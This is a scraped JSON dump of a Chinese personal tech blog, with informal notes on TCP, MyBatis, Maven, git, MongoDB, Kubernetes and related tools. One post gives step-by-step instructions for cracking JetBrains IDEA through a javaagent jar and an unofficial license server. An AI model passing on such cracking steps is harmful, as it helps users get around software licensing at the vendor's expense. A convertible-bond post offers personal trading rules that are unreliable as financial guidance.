在网络中，每次传输的数据不能太大，受限于具体的网络传输设备（物理特性） IP 协议拆分太多的封包并没有意义 可能会导致属于同个 TCP 段的封包被不同的网络线传输，加大延迟 拆包需要消耗硬件和计算资源 是不是 MSS 越小越好呢？ MSS 太小的情况，会浪费传输资源（降低吞吐量） 无法获得完美的解决方案需要实验测试她 总结 TCP 协议是如何恢复数据的顺序的，TCP 拆包和粘包的作用是什么 TCP 拆包的作用，将任务拆分处理，降低整体任务出错的概率，以及减小底层网络处理的压力，粘包过程需要保证数据经过网络的传输，又能恢复到原来的数据 需要数学提供保证顺序的理论依据，TCP 利用 （发送字节数，接受字节数）的唯一性来确认封包直接的顺序关系 TODO 本篇文章未完成","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"计算机网络入门-TCP/UDP","slug":"计网/计网-入门","date":"2021-06-19T11:23:11.000Z","updated":"2021-06-21T08:26:51.799Z","comments":true,"path":"2021/06/19/计网/计网-入门/","link":"","permalink":"https://www.shanghua.live/2021/06/19/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91-%E5%85%A5%E9%97%A8/","excerpt":"为什么 TCP 握手三次，挥手却四次","text":"为什么 TCP 握手三次，挥手却四次 TCP 传输层协议，提供给 Host-To-Host 数据的可靠性传输，支持全双工，是一个连接导向的协议这里主要涉及到，主机到主机、连接、会话、双工/单工及可靠性 主机到主机（Host-To-Host）提供的是 Host-To-Host 传输，一台主机通过 TCP 发送数据到另一台主机可以是电脑-手机-平板TCP 协议往上上 应用到应用 (Application-To-Application) 的协议微信的聊天协议想要工作，就需要一个主机到主机的工具互联网协议群（TCP/IP 协议群） graph LR; A[应用层] --&gt; B[传输层] --&gt; C[网络层] --&gt; D[数据链路层] --&gt; E[物理层] 网络层 提供地址到地址的通讯，不负责信号在具体两个设备传递主机到主机为应用提供应用间通讯的能力 连接（Connection）连接数网络行为状态的记录通讯双方的一个约定，目标是让两个在通讯的程序之间产生一个默契，保证两个程序都在线而且尽快的响应对象的请求两个应用会维护一个关联的对象，比如双方 IP 和 端口 是多少？现在发送了多少数据了，状态健康吗，传输速度如何 双工/单工问题 问题名称 概念 需要几条线路 单工 在任何时刻，如果数据只能单向发送 只需 1 条 半双工 在任何时刻数据可以向一个方向传输 也可以在另一个反方向传输，而且交替进行 至少一条 全双工 如果任何时刻数据都可以双向收发 大于 1 条 线路，是一个抽象的概念，你可以并发的处理信号，达到模拟双工的目的TCP 一个双工协议，数据任何时候都可以双向传输客户端和服务的在 TCP 协议中有一个平等的名词 Host（主机） 可靠性 可靠性（数据保证无损传输）如果发送方按照顺序发送，然后数据无序地主网络间传输，就必须有一种算法在接受方将数据恢复原有的顺序 多播情况如果有一个消息到达任何一个接受者，那么所有接受者都必须收到这个消息 TCP 的握手和挥手TCP 是一个连接导向的协议，设计有建立连接（握手）和断开连接（挥手的过程） 如果一个 Host 主动向另一个 Host 发起连接，被称为 SYN （Synchronization），请求同步 如果一个 Host 主动断开请求，称之为 FIN （Finish），请求完成 如果一个 Host 给另一个 Host 发送数据，成为 PSH （Push），数据推送 接收方接受到数据后，都需要给发送方一个 ACK（Acknowledgement） 响应，如果不响应，发送方会以为需要重发请求保持连接的可靠性约束，TCP 协议要保证每一条发出的数据必须给返回 建立连接的过程（三次握手）sequenceDiagram 客户端-&gt;&gt;服务端:1.客户端发送消息给服务端（SYN） [一次握手] note over 服务端: 2. 服务端准备好进行连接 note right of 服务端: [服务端的准备，不算握手] 服务端-&gt;&gt;客户端: 3. 服务端针对客户端的 SYN 给一个 ACK [三四是同时发生的，算一次握手，第二次握手] 服务端-&gt;&gt;客户端: 4. 服务端发送一个 SYN 给客户端 [三四可以合并成一个 SYN-RCVD 作为一条响应] note over 客户端: 5. 客户端准备好进行连接 note left of 客户端: 客户端准备 不算握手 客户端-&gt;&gt;服务端: 6.客户端针对 SYN 给服务端一个 ACK [第三次握手] 为 TCP 协议增加协议头，在协议头中取对个位（bit），其中 SYN，ACK，PSH 都占有一个位 断开连接的过程（四次挥手） 客户端要求断开连接，发送一个断开的请求，这个叫做 （FIN） 服务端收到请求，然后给客户端一个 ACK，作为 FIN 的响应。 不能像握手一样马上穿回 FIN 回去，因为断开连接要处理的问题比较多，比如说客服务的还有发送出去的消息没有得到 ACK；也可能自己有资源要释放，因此不能将两条消息合并。所以客户端经过等待确认可以关闭连接了，再发生一条 FIN 给客户端 sequenceDiagram 客户端-&gt;&gt;服务端: FIN 请求断开连接 服务端-&gt;&gt;客户端: ACK 响应 客户端 FIN note over 服务端: 服务端处理完事情 服务端-&gt;&gt;客户端: FIN 请求断开连接 客户端-&gt;&gt;服务端: ACK 响应 服务端 FIN 总结 TCP 提供连接（Connection），让双法的传输更加的稳定、安全 TCP 没有直接提供会话，因为应用对会话的需求多种多样，比如聊天程序会话会保持双方的聊天记录，电商程序会话会保持购物车、订单一致，所以会话通常在 TCP 连接上进一步封装 TCP 是一个面相连接的协议（Connection-orented Protocol），说的就是 TCP 协议参与的双方（Host）在收发数据之前会先建立连接。 UDP 是一个面向报文（Datagramo-oriented） 的协议双方不需要建立连接，直接传送报文（数据） 最后，连接 u 要消耗更多的资源；比如说，在传输数据前，必须先协商建立连接，因此，不是每种场景都应该用连接导向的协议。比如视频播放的场景，如果使用连接导向的协议，服务端没向客户端推送一帧视频，客户端都要给服务端响应这是不合理的","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"mybatis-源码分析","slug":"mybatis/mybatis-源码分析","date":"2020-07-28T00:00:00.000Z","updated":"2021-06-20T05:10:29.862Z","comments":true,"path":"2020/07/28/mybatis/mybatis-源码分析/","link":"","permalink":"https://www.shanghua.live/2020/07/28/mybatis/mybatis-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"传统 JDBC 的问题","text":"传统 JDBC 的问题 数据库配置信息存在硬编码问题 解决方法: 1,配置文件 频繁创建释放数据库连接 2,数据库连接池 sql、设置参数,获取结果集均存在硬编码问题 ３，配置文件 手动封装返回结果集，比较繁琐 4,反射，内省 自定义持久层框架设计思路 使用端：（项目）：引入自定义持久层的 jar 包 提供了两部分配置信息：数据库配置信息，sql 配置信息：sql 语句，参数类型，返回值类型 使用配置文件提供这两部分信息 sql Ｍ apConfig.xml 存放数据库配置信息，存放 mapper.xml 的全路径 mapper.xml: 存放 sql 配置信息 自定义持久从逛街本身：（工程）：本质就是对 JDBC 代码进行了封装 加载配置文件：根据配置文件的路径，加载配置文件成字符输入流，存储在内存中 创建 Resource 类 方法 InputStream getResourceAsStream(String path) 创建两个 JavaBean:(容器对象)：存放的就是配置文件解析出来的内容 Configuration:核心配置类：存放 sqlMapConfig.xml 解析的内容 MappedStatement：映射配置类：存放 mapper.xml 解析出来的内容 解析配置文件：dom4j 创建一个类：SqlSessionFactoryBuilder 方法: build (InputStream in) 第一 : 使用 dom4j 解析配置文件，将解析出来的内容封装到容器对象中 第二创建 SqlSessionFactory 对象;生产 sqlSession ：会话对象(工厂模式) 创建 SqlSessionFactory 接口实现类 DefaultSqlSessionFactory 第一 openSession():生产 sqlSession 创建 SqlSession 接口及实现类 DefaultSqlSession 定义对数据库的 crud 操作：selectList(),selectOne(),update(),delete() 创建 Executor 接口及实现类 SimpleExecutor query(Configuration,MappedStatement,Object…params) 执行的就是 JDBC 代码","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://www.shanghua.live/tags/Mybatis/"}]},{"title":"mybatis-源码学习","slug":"mybatis/mybatis-源码学习","date":"2020-07-26T00:00:00.000Z","updated":"2021-06-20T05:10:29.989Z","comments":true,"path":"2020/07/26/mybatis/mybatis-源码学习/","link":"","permalink":"https://www.shanghua.live/2020/07/26/mybatis/mybatis-%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/","excerpt":"传统 JDBC 弊端","text":"传统 JDBC 弊端 JDBC 底层没有用连接池,操作数据库需要频繁创建和关联链接.消耗很大的资源. 原生 jdbc 代码在 java 中,一旦我们需要修改 sql 的话,java 需要整体编译,不利于系统维护. 使用 PreparedStatement 预编译的话对变量进行设置 123 数字,这样的序号不利于维护. 返回 result 结果集也需要硬编码. mybatis 配置方式 使用 xml 方式并不需要创建 Mapper Class 文件 使用 注解方式需要创建 Mapper Class 文件 mybatis 核心概念 名称 意义 Configuration 管理 mysql-config.xml 全局配置关系类 SqlSessionFactory Session 管理工厂接口 Session SqlSession 是一个面向用户（程序员）的接口。SqlSession 提供了很多操作数据库的方法 Executor 执行其是一个接口（基于执行器、缓存执行器）作用: SqlSession 内部通过执行器操作数据库 MappendStatement 底层封装对象 作用: 对操作数据库存储封装,包括 sql 语句、输入输出 StatementHandler 具体操作数据库相关的 handler 接口 ResultSetHandler 具体操作数据库返回结果的 handler 接口","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://www.shanghua.live/tags/Mybatis/"}]},{"title":"vim 入门","slug":"Linux/vim-入门","date":"2020-07-24T00:00:00.000Z","updated":"2021-06-20T05:12:40.753Z","comments":true,"path":"2020/07/24/Linux/vim-入门/","link":"","permalink":"https://www.shanghua.live/2020/07/24/Linux/vim-%E5%85%A5%E9%97%A8/","excerpt":"vim 常用快捷键移动光标","text":"vim 常用快捷键移动光标 h j k l 控制上下作用,也可以使用方向键 ctrl + b 屏幕往后移动一页 f 屏幕往前移动一页 u 屏幕往后移动半页 d 屏幕往前移动半页 shift + g == G 移动文章到最后 4 == $ 移动到所在行的行尾 6 == ^ 移动到光标所在行首 w 光标跳到下一个单词开头 e 光标跳到下一个单词的词尾 b 光标回到上个字的开头 :1 跳到第数字行 gg 进入到文本的开始 常用命令 :nu 显示当前行数 :set nu 显示所有行数 :set expandtab tab 为 4 个空格 :set autoindent 保持当前缩进 复制粘贴 yy 复制光标当前行 p 粘贴到当前光标下一行","categories":[],"tags":[{"name":"Vim","slug":"Vim","permalink":"https://www.shanghua.live/tags/Vim/"}]},{"title":"maven-入门","slug":"maven/maven-入门","date":"2020-07-20T00:00:00.000Z","updated":"2021-06-20T05:10:44.642Z","comments":true,"path":"2020/07/20/maven/maven-入门/","link":"","permalink":"https://www.shanghua.live/2020/07/20/maven/maven-%E5%85%A5%E9%97%A8/","excerpt":"maven 使用简介","text":"maven 使用简介 maven 使用,在项目目录创建 pom.xml 文件,格式是 12345678910111213141516&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.wang&lt;/groupId&gt; &lt;artifactId&gt;shanghua-maven&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt;&lt;/project&gt; maven 使用一种约定大于配置的模式,所以项目必须严格按照 maven 的约定进行开发 maven 目录结构 src/main/java 内放如 java 源代码 src/main/resource 资源目录 src/test pom.xml maven 文件 maven 常用命令 mvn clean 清楚打包内容 mvn compile 编译项目 maven 测试 测试文件必须放入到 src/test/java,类名以 Test 开头,方法名以 test 开头 执行 mvn test 即可 执行所以 test 开头方法 编译好的 test 文件 在 target/test-classes 下 测试结果在 target/surefire-reports 下 使用 junit 进行测试,在 pom.xml 内加入 123456&lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; 加入后必须在需要执行的方法上加上 @Test 注解才会运行 maven 仓库 本地仓库 可通过修改本地 maven 配置文件 settings.xml &lt;localRepository&gt; 修改仓库目录 远程仓库可通过添加 mirror 节点添加. maven 项目依赖 依赖一个框架的时候,会同时依赖此项目的所以依赖 依赖优先原则 下方的依赖会覆盖上方的依赖 相同路径下的,配置在前优先 依赖范围 &lt;scope&gt; 配置在 &lt;dependency&gt; 下限制依赖范围 compile: 默认,编译范围,编译和打包都会依赖 provided:提供范围,编译时依赖,但不会打包进去,如 server-api.jar runtime: 运行时范围,打包时依赖,编译不会,如 mysql-connector.jar test: 测试范围,运行测试用例依赖,如 junit.jar, test jar 包只有 src/test 内的文件才能引用 system: 表示由系统中的 CLASSPATH 指定,编译时依赖,不会打包进去,配合 &lt;systemPath&gt; 一起使用,如 java.home 下的 tool.jar maven 依赖管理 父类内可声明 &lt;dependencyManagement&gt; 内部可写 &lt;dependencies&gt; 子类依赖父类后,并不会直接依赖父类 &lt;dependencyManagement&gt; 内声明的内容,只有声明后才会依赖,依赖可省略版本号 maven 默认属性 $&#123;basedir&#125; 项目根目录 $&#123;version&#125; 项目版本 $&#123;project.basedir&#125; 同 $&#123;basedir&#125; $&#123;project.version&#125; 同 $&#123;version&#125; $&#123;project.build.directory&#125; 构建目录,缺省为 target $&#123;project.build.sourcceEncoding&#125; 表示主源码的编码格式 $&#123;project.build.sourceDirectory&#125; 表示主源码路径 $&#123;project.build.finalName&#125; 表示输出文件名称 $&#123;project.build.outputDirectory&#125; 构建过程输出目录,缺省 target/classes 默认属性可在 resource 目录下配置文件 以及 pom.xml 内使用, 属性还可以通过 执行 mvn 命令是加入 -D 参数添加 项目生命周期123graph LRA[预编译] --&gt;B[编译] --&gt; C[编译测试类] --&gt; D[构建] --&gt; G[jar 包构建] --&gt; F[部署]D --&gt; H[war 包构建] --&gt; F[部署] maven 生命周期 clean : 清理生命周期,用于清理项目 default:默认生命周期,用于编译,打包,测试,部署等 site: 站点文档生成,用于构建站点文档 当执行下面生命周期的目录时,会将上方的生命周期走一边 maven 生命周期命令大部分是由插件完成的,例如 test 就是由 maven-surefire-plugin","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Maven","slug":"Maven","permalink":"https://www.shanghua.live/tags/Maven/"}]},{"title":"maven-插件","slug":"maven/maven-插件","date":"2020-07-20T00:00:00.000Z","updated":"2021-06-20T05:10:44.547Z","comments":true,"path":"2020/07/20/maven/maven-插件/","link":"","permalink":"https://www.shanghua.live/2020/07/20/maven/maven-%E6%8F%92%E4%BB%B6/","excerpt":"maven 命令 mvn dependency:tree 可查看插件的依赖关系","text":"maven 命令 mvn dependency:tree 可查看插件的依赖关系 mvn archetype:generate 使用 maven 生成项目 mvn help:effective-pom maven 插件绑定 生命周期的阶段可以绑定具体的插件及目标 不同配置下同一阶段可以对应多个插件和目标 maven 绑定插件的目录在 MAVEN_HOME\\lib\\maven-core.jar\\META-INF\\plexus\\default-bindings.xml maven 插件使用示例 123456789101112131415161718192021222324&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;!-- 在执行 package后 将依赖复制到 $&#123;project.build.directory&#125;/alternateLocation 目录下--&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt; &lt;version&gt;3.1.2&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;copy-dependencies&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;!-- 指定 goal 执行位置--&gt; &lt;goals&gt; &lt;goal&gt;copy-dependencies&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;!-- 指定配置文件--&gt; &lt;outputDirectory&gt;$&#123;project.build.directory&#125;/alternateLocation&lt;/outputDirectory&gt; &lt;overWriteReleases&gt;false&lt;/overWriteReleases&gt; &lt;overWriteSnapshots&gt;false&lt;/overWriteSnapshots&gt; &lt;overWriteIfNewer&gt;true&lt;/overWriteIfNewer&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 插件使用第二种方法 mvn groupId:artifactId:version:goal -D{参数名} 插件开发流程 创建 maven 插件项目 设定 packaging 为 maven-plugin 添加插件依赖 编写插件实现逻辑 打包构建插件 插件 pom 配置 创建 maven 项目 定义&lt;packaging&gt;maven-plugin&lt;/packaging&gt; 引入 maven-plugin-api maven-plugin-annotations 依赖 插件方法类继承 org.apache.maven.plugin.AbstractMojo 实现 execute 方法 可在全局变量上方加上 org.apache.maven.plugins.annotations.Parameter 注解,获取 maven 参数 maven nexus 私服 搭建完成后可通过添加 repositories 制定 maven 服务器 也可通过修改 maven setting.xml 中的 mirrors 全局指定服务器 如需要 deploy jar 包到私服,需要在 pom.xml 下的 distributionManagement 下制定私服地址,并在 setting.xml 文件下添加 server 节点添加用户获取权限,并且 server 下的 id 需要与 distributionManagement 下的 id 对应","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Maven","slug":"Maven","permalink":"https://www.shanghua.live/tags/Maven/"}]},{"title":"git-入门","slug":"Git/git-入门","date":"2020-07-17T00:00:00.000Z","updated":"2021-06-20T05:11:51.904Z","comments":true,"path":"2020/07/17/Git/git-入门/","link":"","permalink":"https://www.shanghua.live/2020/07/17/Git/git-%E5%85%A5%E9%97%A8/","excerpt":"git 存储文件时候会将一个文件存储到一个数据库中","text":"git 存储文件时候会将一个文件存储到一个数据库中 git 常用命令 git init ./目录名 初始化，初始化后会创建一个 .git 文件夹 元数据存储在 objects 中 git add 将文件存储到暂存取 -A 将所有文件存储到暂存取 git rm –cached 将文件从暂存区删除，本地文件并不会被删除 git commit filename -m ‘first commit’ 将暂存区文件提交到本地仓库 git push -u origin master 将本地仓库提交到远程仓库 master git config –list 查看 git 配置环境 git show 查看最后一次提交 git 分支相关命令 git branch 默认查看分支 -avv 查看所有分支 -d 删除分支 git branch 分支名 父分支名 创建一个分支 git gc 当强制删除一个分支的时候，分支内的信息还是存在的，通过这个命令可打包项目信息，跳过删除的信息 git 解决冲突 当远程仓库内容被修改，pull 的时候由于本地仓库与远程仓库文件冲突，会进入到一个解决冲突的分支，需要解决冲突后，重新执行 add commit push 操作解决冲突 git 远程仓库 git remote add origin url 指定远程仓库 git remote add origin2 url 添加远程仓库 git remote origin set-url url 修改远程地址 git remote temove 分支名 删除远程仓库 git push –set-upstream origin master 上传至远程分支 git branch –track git tag git tag 查看当前 tag git tag tag 名 创建 tag git 日志管理 git log 查看日志 –oneline 简单查看 –graph 图形网络 git log 分支名 查看某个分支的日志 git log dev..master 查看多少个 master 没有提交到 dev 内 git 底层原理 git 存储对象(hashMap) find .git/objects/ -type f 查找所有 git 对象 git hash-object -w filename 存储一个文件，并返回 hash，相当与 git add git cat-file -p hash 通过 hash 查看文件内容，我们并不知道文件内容属于哪个文件 git cat-file -p master^{tree} 查看一个提交的文件的信息，包含文件名 git commit 提交会包含一个 commit 对象，对象包含一个文件对象，包含文件名以及对应的 keycommit 对象 还包含一个 src 树对象 书对象包含 层级目录对象，直至目录中的文件，文件包含文件名以及 key 通过 git log 可查看 commit 对象包含的 keygit cat-file -p key 可查看 commit 包含的内容内容包含一个 tree 对象以及一个树对象一个新 commit 产生的时候 改变的文件会将 上级的 key 改变 直到 commit key git 创建中央仓库 git init –bare shanghua.git 创建裸项目，只要能访问这个目录就能进行开发，甚至是共享文件夹 git clone root@ip:项目目录 通过这条命令可访问上一条命令在远程仓库创建的项目，通过 ssh 协议搭建 中央仓库 通过 nginx 搭建 http 中央仓库 http(dump) 协议 1234567server&#123; listen 80; server_name git.shanghua.com; location / &#123; root /data/git-repository; # 仓库地址 &#125;&#125; 重命名钩子mv hooks/post-update.sample hooks/post-update 本地克隆 git clone http://git.shanghua.com/shanghua.git 通过 git 协议搭建远程仓库 git 协议 123nohup git daemon --reuseaddr --base-path=&#x27;项目目录&#x27; &#x27;项目目录&#x27;默认端口是 9418git clone git://ip:9418/shanghua.git shanghua git 服务器搭建git gogs 服务器 gogs 官网 https://gogs.io/ 下载安装包 解压进入 gogs 目录 ./gogs web 即可运行 浏览器访问本地 ip:3000 即可初始化项目 gogs 可配置 邮箱服务器 gogs 备份 ./gogs backup -h 查看备份相关参数 ./gogs backup 默认备份,备份在当前目录 ./gogs backup –target=’输出目录’ –database-only –exclude-repos ./gogs restore –from=’备份文件’ 备份恢复","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://www.shanghua.live/tags/git/"}]},{"title":"IDEA 破解教程","slug":"Java/idea-破解","date":"2020-05-08T10:38:00.000Z","updated":"2021-06-20T05:09:17.259Z","comments":true,"path":"2020/05/08/Java/idea-破解/","link":"","permalink":"https://www.shanghua.live/2020/05/08/Java/idea-%E7%A0%B4%E8%A7%A3/","excerpt":"下载破解 jar 包 下载地址 下载后解压","text":"下载破解 jar 包 下载地址 下载后解压 打开 IDEA 在试用模式下点击 Help –&gt; Edit Custom VM Option 第一次点击会让创建一个文件，点击确定 在最后一行加入 -javaagent:你解压后jar包的位置 重启 IDEA IDEA 启动后点击 Help –&gt; Register –&gt; License server 在 Server address 内输入 http://fls.jetbrains-agent.com 点击 ACTIVATE 成功后点击 CONTINUE DONE 使用方法来自 https://zhile.io/2018/08/25/jetbrains-license-server-crack.html","categories":[],"tags":[{"name":"IDEA","slug":"IDEA","permalink":"https://www.shanghua.live/tags/IDEA/"}]},{"title":"可转债","slug":"股市/可转债","date":"2020-04-28T20:16:00.000Z","updated":"2021-06-20T05:12:09.575Z","comments":true,"path":"2020/04/29/股市/可转债/","link":"","permalink":"https://www.shanghua.live/2020/04/29/%E8%82%A1%E5%B8%82/%E5%8F%AF%E8%BD%AC%E5%80%BA/","excerpt":"打新可转债 判断新债 https://www.jisilu.cn/data/cbnew/#pre","text":"打新可转债 判断新债 https://www.jisilu.cn/data/cbnew/#pre 先价比转股甲 先价比转股价 &gt; 95% 评级 AA、AA+、AAA 可转债说明可转换是一张可以转化成股票的公司债券 可转债 债券 在可转债到期后公司需要连本带息还钱 100￥ + 利息 &gt; 100￥ 在 &lt; 100人民币 买入可保本 可转换为股票 可转债会随着股票的价格增长而增长 尽可能购买评级高的股票 防御性买入法（慢） 买入价格 &lt; 100￥ 评级 AA 级以上 进攻型买入法（快） 溢价率低于 20% 上市满足半年 价格低于 110 评级至少为 至少AA 怎么卖 上涨不卖 最高点 跌 10 元卖出","categories":[],"tags":[]},{"title":"elasticsearch 与 Head 插件","slug":"other/elasticsearch","date":"2020-04-08T00:00:00.000Z","updated":"2021-06-20T05:13:06.480Z","comments":true,"path":"2020/04/08/other/elasticsearch/","link":"","permalink":"https://www.shanghua.live/2020/04/08/other/elasticsearch/","excerpt":"","text":"基础命令 查询 进入 Head 插件 复合查询 http://localhost:9200/ _analyze POST Body &#123;&quot;analyzer&quot;:&quot;ik_smart&quot;,&quot;text&quot;:&quot;php java&quot;&#125;","categories":[],"tags":[{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://www.shanghua.live/tags/elasticsearch/"}]},{"title":"MongoDB 的安装和使用","slug":"other/MongoDB","date":"2020-04-03T15:44:15.000Z","updated":"2021-06-20T05:13:06.830Z","comments":true,"path":"2020/04/03/other/MongoDB/","link":"","permalink":"https://www.shanghua.live/2020/04/03/other/MongoDB/","excerpt":"安装 MongoDB 进入到 https://www.mongodb.com/download-center/community 即可选择符合你操作系统的安装包 按照安装包指示的流程安装即可 安装完成后将安装后的 bin 目录加入到系统 path 环境变量中","text":"安装 MongoDB 进入到 https://www.mongodb.com/download-center/community 即可选择符合你操作系统的安装包 按照安装包指示的流程安装即可 安装完成后将安装后的 bin 目录加入到系统 path 环境变量中 使用 MongoDB 创建目录 打开命令提示符 创建存放数据的目录 md d:\\data 启动服务 mongod ‐‐dbpath=d:\\data 连接 mongo 192.168.184.134 常用命令 创建数据库 use 数据库名 数据库不存在则会自动创建 use spit 插入数据 db.数据库名.insert(数据); db.spit.insert(&#123;content:&quot;aaa&quot;,userid:&quot;1011&quot;,nickname:&quot;小雅&quot;,visits:NumberInt(902)&#125;); 查询数据 db.集合名称.find(); db.spit.find(); 可以发现，每个数据库文档都会自动创建一个 _id 字段，相当于数据库的主键，我们可以插入支持的类型值替换 db.spit.insert(&#123;_id:&quot;1&quot;,content:&quot;aaa&quot;,userid:&quot;1012&quot;,nickname:&quot;小明&quot;,visits:NumberInt(2020)&#125;); 条件查询 db.spit.find(&#123;userid:&#39;1011&#39;&#125;) 查询一个 db.spit.findOne(&#123;userid:&#39;1013&#39;&#125;) 指定条数 db.spit.find().limit(3) 修改数据 db.集合名称.update(条件,修改后的数据) 修改 _id 为 1 的记录 db.spit.update(&#123;_id:&quot;1&quot;&#125;,&#123;visits:NumberInt(1000)&#125;) 修改后除了 visits 字段其他字段都不见了，我们可以使用 $set 解决 db.spit.update(&#123;_id:&quot;2&quot;&#125;,&#123;$set:&#123;visits:NumberInt(2000)&#125;&#125;) 删除数据 db.集合名称.remove(条件) 入过没条件则全部删除 慎用！ db.集合名称.remove(&#123;visits:1000&#125;) 删除 visits 为 100 的值 统计条数 db.spit.count() db.spit.count(&#123;userid:&quot;1012&quot;&#125;) 统计 userid 为 1012 的数量\\ 模糊查询 /模糊查询字符串/ db.spit.find(&#123;content:/流量/&#125;) db.spit.find(&#123;content:/^加班/&#125;) 大于 小于 不等于 db.集合名称.find(&#123; &quot;field&quot; : &#123; $gt: value &#125;&#125;) // 大于: field &gt; value db.集合名称.find(&#123; &quot;field&quot; : &#123; $lt: value &#125;&#125;) // 小于: field &lt; value db.集合名称.find(&#123; &quot;field&quot; : &#123; $gte: value &#125;&#125;) // 大于等于: field &gt;= value db.集合名称.find(&#123; &quot;field&quot; : &#123; $lte: value &#125;&#125;) // 小于等于: field &lt;= value db.集合名称.find(&#123; &quot;field&quot; : &#123; $ne: value &#125;&#125;) // 不等于: field != value 包含与不包含 db.spit.find(&#123;userid:&#123;$in:[&quot;1013&quot;,&quot;1014&quot;]&#125;&#125;) 查询 useid 字段包含 1013 和 1014 的文档 db.spit.find(&#123;userid:&#123;$nin:[&quot;1013&quot;,&quot;1014&quot;]&#125;&#125;) 查询 useid 字段不包含 1013 和 1014 的文档 条件连接 $and:[ &#123; &#125;,&#123; &#125;,&#123; &#125; ] 相当于 SQL 中的 AND db.spit.find(&#123;$and:[ &#123;visits:&#123;$gte:1000&#125;&#125; ,&#123;visits:&#123;$lt:2000&#125; &#125;]&#125;) 查询 visits 大于 1000 并且小于 2000 的文档 $or:[ &#123; &#125;,&#123; &#125;,&#123; &#125; ] 相当于 SQL 中的 OR db.spit.find(&#123;$or:[ &#123;userid:&#123;$gte:&quot;1013&quot;&#125;&#125; ,&#123;visits:&#123;$lt:2000&#125; &#125;]&#125;) 查询 userid 等于 1013 并且 visits 小于 2000 的文档 列值增长 db.spit.update(&#123;_id:&quot;2&quot;&#125;,&#123;$inc:&#123;visits:NumberInt(1)&#125;&#125;)","categories":[],"tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"https://www.shanghua.live/tags/MongoDB/"}]},{"title":"K8s(kubernetes) 简介","slug":"other/k8sAbout","date":"2020-03-30T20:50:23.000Z","updated":"2021-06-20T05:13:06.663Z","comments":true,"path":"2020/03/31/other/k8sAbout/","link":"","permalink":"https://www.shanghua.live/2020/03/31/other/k8sAbout/","excerpt":"kubernetes容器编排工具，是一个开源的平台，可以实现容器集群的自动化部署，自动扩缩容，维护等功能","text":"kubernetes容器编排工具，是一个开源的平台，可以实现容器集群的自动化部署，自动扩缩容，维护等功能 快速部署应用 快速扩展应用 无缝对接新的应用功能 节省资源，优化硬件资源应用 特点 可移植 支持公有云（阿里云，腾讯云），私有云（OpenStack），混合云，多重云（多个公有云） 可扩展 模块化，插件化，可挂载，可组合 自动化 自动部署，自动重启，自动复制，自动伸缩/扩展 kubernetes 的目标是促进完善组件和工具的生态系统，已减轻应用程序在公有云或私有云运行的负担","categories":[],"tags":[{"name":"k8","slug":"k8","permalink":"https://www.shanghua.live/tags/k8/"}]},{"title":"使用 SSH 连接 Ubuntu","slug":"Linux/ubuntu-ssh","date":"2020-03-30T20:27:22.000Z","updated":"2021-06-20T05:11:39.044Z","comments":true,"path":"2020/03/31/Linux/ubuntu-ssh/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Linux/ubuntu-ssh/","excerpt":"软件准备FinalShell 软件官网 http://www.hostbuf.com/ 因为我们之前安装系统的时候已经安装过 SSH 了，这里我们直接连接就好了","text":"软件准备FinalShell 软件官网 http://www.hostbuf.com/ 因为我们之前安装系统的时候已经安装过 SSH 了，这里我们直接连接就好了 第一步查看 IP 地址，在命令行输入 ifconfig 123456789shanghua@ubuntu:~$ ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.1.103 netmask 255.255.255.0 broadcast 192.168.1.255 inet6 fe80::20c:29ff:fe32:75e2 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:32:75:e2 txqueuelen 1000 (Ethernet) RX packets 29766 bytes 43406394 (43.4 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 3187 bytes 257063 (257.0 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 这里我的 IP 地址就是 192.168.1.103 打开 FinalShell 并新建一个连接 点击确定，这样我们就连接成功了 12345连接成功To run a command as administrator (user &quot;root&quot;), use &quot;sudo 